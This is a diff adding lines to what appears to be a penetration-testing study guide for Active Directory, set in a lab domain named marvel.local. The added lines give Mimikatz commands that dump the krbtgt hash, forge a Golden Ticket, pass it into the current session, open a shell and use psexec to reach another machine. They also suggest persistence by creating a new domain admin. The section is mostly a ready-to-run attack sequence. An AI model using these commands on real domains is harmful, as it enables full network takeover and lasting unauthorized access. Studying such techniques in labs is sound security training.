@@ -364,3 +364,12 @@
 * `mimikatz.exe`
 * `privilege::debug`
 * `lsadump::lsa /inject /name:krbtgt`
+* open up a note pad and copy from output: SID and the NTLM hash
+* `kerberos::golden /User:Administrator /domain:marvel.local /sid:<copy it from notepad> /krbtgt:<copy the hash from notepad> /id:500 /ptt`
+* ***id:500*** is the ID of an admin account and ***/ptt*** is for ***pass the ticket***
+* we are generating a golden ticket and then will pass that ticket along to our current session and utilize it to open up a command prompt and access any computer on the network we want
+* `misc::cmd` this will pop up a cmd window and in that window we are utilizing the Golden Ticket that we just created
+* to take this a step furter we could download ***psexec.py*** to this computer hence this was the whole intent of the creation of psexec, to access computers `psexec.exe \\THEPUNISHER cmd.exe`
+* **presistence:** once you own a Golden Ticket you can create a new user, make it a domain admin, most systems are picking it up, try better with a ***silver ticket***
+
+![Golden Ticket Attack](images/golden_ticket_attack.png)
